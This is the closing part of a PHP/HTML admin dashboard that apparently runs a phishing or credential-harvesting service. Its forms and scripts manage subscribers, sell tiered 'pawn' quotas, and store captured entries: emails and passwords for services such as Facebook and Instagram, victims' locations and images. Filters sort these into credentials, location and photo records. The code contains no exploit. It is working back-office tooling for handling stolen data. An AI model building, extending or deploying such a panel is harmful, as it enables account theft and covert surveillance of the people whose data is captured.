            <input type="hidden" name="user_id" id="edit_user_id">
            <input type="hidden" name="update_user" value="1">
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">Name</label>
                <input type="text" name="name" id="edit_name" class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">Email</label>
                <input type="email" name="email" id="edit_email" class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">Token</label>
                <input type="number" name="token" id="edit_token" class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">Pawn Limit</label>
                <input type="number" name="count" id="edit_count" class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">Project Limit</label>
                <input type="number" name="project" id="edit_project" class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="mb-4">
                <label class="text-gray-300 text-sm block mb-1">Dev Projects (comma separated)</label>
                <textarea name="dev" id="edit_dev" rows="2" class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500"></textarea>
            </div>
            <div class="mb-4">
                <label class="flex items-center">
                    <input type="checkbox" name="is_admin" id="edit_is_admin" value="1" class="mr-2">
                    <span class="text-gray-300 text-sm">Administrator</span>
                </label>
            </div>
            <div class="flex gap-3">
                <button type="submit" class="btn-primary flex-1 py-2 rounded-xl text-white font-medium transition">Save</button>
                <button type="button" onclick="closeModal('editUserModal')" class="flex-1 py-2 rounded-xl bg-white/10 text-gray-300 hover:bg-white/20 transition">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="subModal" class="modal fixed inset-0 bg-black/80 backdrop-blur-sm z-50 items-center justify-center hidden">
    <div class="glass-card rounded-2xl w-full max-w-md mx-4 p-6">
        <div class="flex justify-between items-center mb-4">
            <h3 class="text-xl font-bold text-white">Manage Subscription</h3>
            <button onclick="closeModal('subModal')" class="text-gray-400 hover:text-white text-2xl transition">&times;</button>
        </div>
        <form method="POST">
            <input type="hidden" name="user_id" id="sub_user_id">
            <input type="hidden" name="update_subscription" value="1">
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">User: <span id="sub_user_name" class="text-purple-300"></span></label>
            </div>
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">Pawn Limit</label>
                <input type="number" name="count" id="sub_count" required class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
                <p class="text-[10px] text-gray-500 mt-1">💡 Basic: 4 | Premium: 20 | Pro: 100+</p>
            </div>
            <div class="mb-4">
                <label class="text-gray-300 text-sm block mb-1">Project Limit</label>
                <input type="number" name="project" id="sub_project" required class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="flex gap-3">
                <button type="submit" class="btn-primary flex-1 py-2 rounded-xl text-white font-medium transition">Upgrade</button>
                <button type="button" onclick="closeModal('subModal')" class="flex-1 py-2 rounded-xl bg-white/10 text-gray-300 hover:bg-white/20 transition">Cancel</button>
            </div>
        </form>
        <div class="mt-4 pt-3 border-t border-purple-500/20">
            <form method="POST">
                <input type="hidden" name="user_id" id="reset_user_id">
                <input type="hidden" name="reset_user_limit" value="1">
                <button type="submit" class="w-full py-2 rounded-xl bg-purple-600/30 text-purple-300 text-sm hover:bg-purple-600/50 transition">Reset to Basic (4 pawns)</button>
            </form>
        </div>
    </div>
</div>

<div id="addPawnModal" class="modal fixed inset-0 bg-black/80 backdrop-blur-sm z-50 items-center justify-center hidden">
    <div class="glass-card rounded-2xl w-full max-w-md mx-4 p-6">
        <div class="flex justify-between items-center mb-4">
            <h3 class="text-xl font-bold text-white">Add Pawn Entry</h3>
            <button onclick="closeModal('addPawnModal')" class="text-gray-400 hover:text-white text-2xl transition">&times;</button>
        </div>
        <form method="POST">
            <input type="hidden" name="user_id" id="add_pawn_user_id">
            <input type="hidden" name="add_pawn" value="1">
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">Email / URL / Path</label>
                <input type="text" name="pawn_email" required class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">Password / Data</label>
                <input type="text" name="pawn_password" required class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="mb-3">
                <label class="text-gray-300 text-sm block mb-1">New Password (optional)</label>
                <input type="text" name="pawn_newpassword" class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="mb-4">
                <label class="text-gray-300 text-sm block mb-1">Page / Service</label>
                <input type="text" name="pawn_page" placeholder="facebook, instagram, location, image..." class="w-full px-3 py-2 bg-black/40 border border-purple-500/30 rounded-lg text-white focus:outline-none focus:border-purple-500">
            </div>
            <div class="flex gap-3">
                <button type="submit" class="btn-primary flex-1 py-2 rounded-xl text-white font-medium transition">Add Pawn</button>
                <button type="button" onclick="closeModal('addPawnModal')" class="flex-1 py-2 rounded-xl bg-white/10 text-gray-300 hover:bg-white/20 transition">Cancel</button>
            </div>
        </form>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.4/js/lightbox.min.js"></script>
<script>
    let currentPageFilter = 'all';
    let currentUserFilter = '';
    let currentStatusFilter = 'all';
    let currentPlanFilter = 'all';
    
    function showToast(message, type) {
        const existingToast = document.querySelector('.toast-message');
        if (existingToast) existingToast.remove();
        const toast = document.createElement('div');
        toast.className = 'toast-message';
        toast.innerHTML = `<i class="bi ${type === 'success' ? 'bi-check-circle-fill' : 'bi-info-circle-fill'} text-purple-400"></i><span class="text-white">${message}</span>`;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }
    
    function copyToClipboard(text, label) {
        navigator.clipboard.writeText(text).then(() => showToast(`${label} copied`, 'success')).catch(() => { 
            const t = document.createElement('textarea'); 
            t.value = text; 
            document.body.appendChild(t); 
            t.select(); 
            document.execCommand('copy'); 
            document.body.removeChild(t); 
            showToast(`${label} copied`, 'success'); 
        });
    }
    
    function copyImage(url) { 
        fetch(url).then(r=>r.blob()).then(b=>navigator.clipboard.write([new ClipboardItem({[b.type]: b})])).then(()=>showToast('Image copied', 'success')).catch(()=>showToast('Copy failed', 'error')); 
    }
    
    function togglePawnSection(header) {
        const userCard = header.closest('.user-card');
        const pawnSection = userCard.querySelector('.pawn-section');
        pawnSection.classList.toggle('collapsed');
        const icon = header.querySelector('.expand-icon');
        if (icon) {
            icon.style.transform = pawnSection.classList.contains('collapsed') ? 'rotate(-90deg)' : 'rotate(0deg)';
        }
    }
    
    function filterAll() {
        const cards = document.querySelectorAll('#usersContainer .user-card');
        let visibleUsers = 0, totalPawns = 0, expiredCount = 0, proCount = 0, devCount = 0;
        
        cards.forEach(card => {
            const name = card.dataset.userName || '';
            const email = card.dataset.userEmail || '';
            const userId = card.dataset.userId || '';
            const status = card.dataset.userStatus || '';
            const plan = card.dataset.userPlan || '';
            const pawns = parseInt(card.dataset.userPawns) || 0;
            const hasDev = card.querySelector('.bi-folder-symlink') !== null;
            
            let showUser = true;
            if (currentUserFilter && !name.includes(currentUserFilter) && !email.includes(currentUserFilter) && !userId.includes(currentUserFilter)) showUser = false;
            if (showUser && currentStatusFilter !== 'all') { 
                if (currentStatusFilter === 'active' && status !== 'active') showUser = false; 
                if (currentStatusFilter === 'expired' && status !== 'expired') showUser = false; 
            }
            if (showUser && currentPlanFilter !== 'all') { 
                if (currentPlanFilter === 'basic' && plan !== 'Basic') showUser = false; 
                if (currentPlanFilter === 'premium' && plan !== 'Premium') showUser = false; 
                if (currentPlanFilter === 'pro' && plan !== 'Pro') showUser = false; 
            }
            
            card.style.display = showUser ? 'block' : 'none';
            
            if (showUser) {
                visibleUsers++; 
                totalPawns += pawns; 
                if (status === 'expired') expiredCount++; 
                if (plan === 'Pro') proCount++; 
                if (hasDev) devCount++;
                
                const pawnCards = card.querySelectorAll('.pawn-card');
                let visiblePawnCount = 0;
                
                pawnCards.forEach(pc => {
                    const pawnPage = pc.dataset.pawnPage || '';
                    let showPawn = true;
                    
                    if (currentPageFilter !== 'all') {
                        if (currentPageFilter === 'location' && !pawnPage.includes('location')) showPawn = false;
                        else if (currentPageFilter === 'image' && !pawnPage.includes('image') && !pawnPage.includes('photo')) showPawn = false;
                        else if (currentPageFilter === 'credentials' && (pawnPage.includes('location') || pawnPage.includes('image') || pawnPage.includes('photo'))) showPawn = false;
                        else if (currentPageFilter !== 'location' && currentPageFilter !== 'image' && currentPageFilter !== 'credentials' && pawnPage !== currentPageFilter) showPawn = false;
                    }
                    
                    if (showPawn) {
                        pc.style.display = 'block';
                        visiblePawnCount++;
                    } else {
                        pc.style.display = 'none';
                    }
                });
                
                const pawnContent = card.querySelector('.pawn-content');
                if (pawnContent) {
                    const totalPawnCount = pawnCards.length;
                    pawnContent.style.display = (totalPawnCount > 0 && visiblePawnCount === 0) ? 'none' : 'block';
                }
            }
        });
        
        document.getElementById('statTotalUsers').innerText = visibleUsers;
        document.getElementById('statTotalPawns').innerText = totalPawns;
        document.getElementById('statExpired').innerText = expiredCount;
        document.getElementById('statPro').innerText = proCount;
        document.getElementById('statDev').innerText = devCount;
    }
    
    document.getElementById('searchUserInput').addEventListener('input', (e) => { currentUserFilter = e.target.value.toLowerCase(); filterAll(); });
    document.getElementById('statusFilter').addEventListener('change', (e) => { currentStatusFilter = e.target.value; filterAll(); });
    document.getElementById('planFilter').addEventListener('change', (e) => { currentPlanFilter = e.target.value; filterAll(); });
    
    document.getElementById('resetFilters').addEventListener('click', () => { 
        document.getElementById('searchUserInput').value = ''; 
        document.getElementById('statusFilter').value = 'all'; 
        document.getElementById('planFilter').value = 'all'; 
        currentUserFilter = ''; 
        currentStatusFilter = 'all'; 
        currentPlanFilter = 'all'; 
        document.querySelectorAll('.page-pill').forEach(b => { 
            b.style.background = 'rgba(255,255,255,0.1)'; 
            b.style.color = '#d1d5db'; 
        }); 
        const allBtn = document.querySelector('.page-pill[data-page="all"]'); 
        if(allBtn){ 
            allBtn.style.background = 'linear-gradient(105deg, #8B5CF6, #C084FC)'; 
            allBtn.style.color = 'white'; 
        } 
        currentPageFilter = 'all'; 
        filterAll(); 
        showToast('Filters reset', 'success'); 
    });
    
    document.querySelectorAll('.page-pill').forEach(btn => { 
        btn.addEventListener('click', () => { 
            document.querySelectorAll('.page-pill').forEach(b => { 
                b.style.background = 'rgba(255,255,255,0.1)'; 
                b.style.color = '#d1d5db'; 
            }); 
            btn.style.background = 'linear-gradient(105deg, #8B5CF6, #C084FC)'; 
            btn.style.color = 'white'; 
            currentPageFilter = btn.dataset.page; 
            filterAll(); 
        }); 
    });
    
    function showProjects(userId, devString, userName) {
        const projects = devString ? devString.split(',').map(p => p.trim()).filter(p => p) : [];
        document.getElementById('projectModalTitle').innerHTML = `Developer Projects - ${escapeHtml(userName)}`;
        let html = `<div class="space-y-3">
            <div class="bg-gradient-to-r from-purple-900/20 to-purple-800/20 rounded-xl p-3">
                <p class="text-sm text-gray-300">📁 Total Projects: <strong class="text-purple-300 text-lg">${projects.length}</strong></p>
            </div>`;
        if (projects.length === 0) {
            html += '<div class="text-center py-6 text-gray-400"><i class="bi bi-folder-x text-4xl"></i><p class="mt-2">No projects assigned to this user</p></div>';
        } else {
            projects.forEach(project => { 
                html += `<div class="bg-black/30 rounded-xl p-3 border border-purple-500/20 hover:border-purple-500/40 transition">
                    <div class="flex justify-between items-center flex-wrap gap-2">
                        <div class="flex items-center gap-2">
                            <i class="bi bi-folder2-open icon-cyan-dark text-xl"></i>
                            <span class="text-white font-mono text-sm">${escapeHtml(project)}</span>
                        </div>
                        <div class="flex gap-2">
                            <a href="../code/${encodeURIComponent(project)}/" target="_blank" class="px-3 py-1 rounded-lg bg-purple-600/30 text-purple-300 hover:bg-purple-600/50 transition text-sm flex items-center gap-1">
                                <i class="bi bi-eye-fill"></i> View
                            </a>
                            <a href="../code/${encodeURIComponent(project)}/?download=1" class="px-3 py-1 rounded-lg bg-emerald-600/30 text-emerald-300 hover:bg-emerald-600/50 transition text-sm flex items-center gap-1">
                                <i class="bi bi-download"></i> Download
                            </a>
                        </div>
                    </div>
                </div>`; 
            });
        }
        html += `<div class="mt-4 pt-3 border-t border-purple-500/20">
            <form method="POST">
                <input type="hidden" name="user_id" value="${userId}">
                <input type="hidden" name="sync_project" value="1">
                <button type="submit" class="w-full py-2 rounded-xl bg-purple-600/30 text-purple-300 text-sm hover:bg-purple-600/50 transition flex items-center justify-center gap-2">
                    <i class="bi bi-cloud-arrow-down"></i> Sync Missing Folders
                </button>
            </form>
        </div>`;
        document.getElementById('projectModalContent').innerHTML = html;
        document.getElementById('projectModal').classList.remove('hidden');
    }
    
    function editUser(user) { 
        document.getElementById('edit_user_id').value = user.id; 
        document.getElementById('edit_name').value = user.name; 
        document.getElementById('edit_email').value = user.email; 
        document.getElementById('edit_token').value = user.token; 
        document.getElementById('edit_count').value = user.count; 
        document.getElementById('edit_project').value = user.project; 
        document.getElementById('edit_dev').value = user.dev || ''; 
        document.getElementById('edit_is_admin').checked = user.is_admin == 1; 
        document.getElementById('editUserModal').classList.remove('hidden'); 
    }
    
    function manageSubscription(user) { 
        document.getElementById('sub_user_id').value = user.id; 
        document.getElementById('sub_user_name').innerText = user.name; 
        document.getElementById('sub_count').value = user.count; 
        document.getElementById('sub_project').value = user.project; 
        document.getElementById('reset_user_id').value = user.id; 
        document.getElementById('subModal').classList.remove('hidden'); 
    }
    
    function addPawn(userId) { 
        document.getElementById('add_pawn_user_id').value = userId; 
        document.getElementById('addPawnModal').classList.remove('hidden'); 
    }
    
    function deleteUser(userId, userName) { 
        if(confirm(`⚠️ Delete user "${userName}" and ALL pawn records?\n\nThis action cannot be undone!`)){ 
            const f=document.createElement('form'); 
            f.method='POST'; 
            f.innerHTML=`<input type="hidden" name="delete_user" value="1"><input type="hidden" name="user_id" value="${userId}">`; 
            document.body.appendChild(f); 
            f.submit(); 
        } 
    }
    
    function closeModal(modalId) { 
        document.getElementById(modalId).classList.add('hidden'); 
    }
    
    function escapeHtml(str) { 
        if(!str) return ''; 
        return str.replace(/[&<>]/g, m => m==='&'?'&amp;':m==='<'?'&lt;':'&gt;'); 
    }
    
    document.addEventListener('keydown', (e) => { 
        if(e.key==='Escape') document.querySelectorAll('.modal').forEach(m=>m.classList.add('hidden')); 
    });
    
    try { 
        lightbox.option({ 'resizeDuration': 200, 'wrapAround': true, 'fadeDuration': 300 }); 
    } catch(e) {}
    
    filterAll();
    <?php if ($message): ?>showToast('<?= addslashes($message) ?>', '<?= $messageType ?>');<?php endif; ?>
</script>
</body>
</html>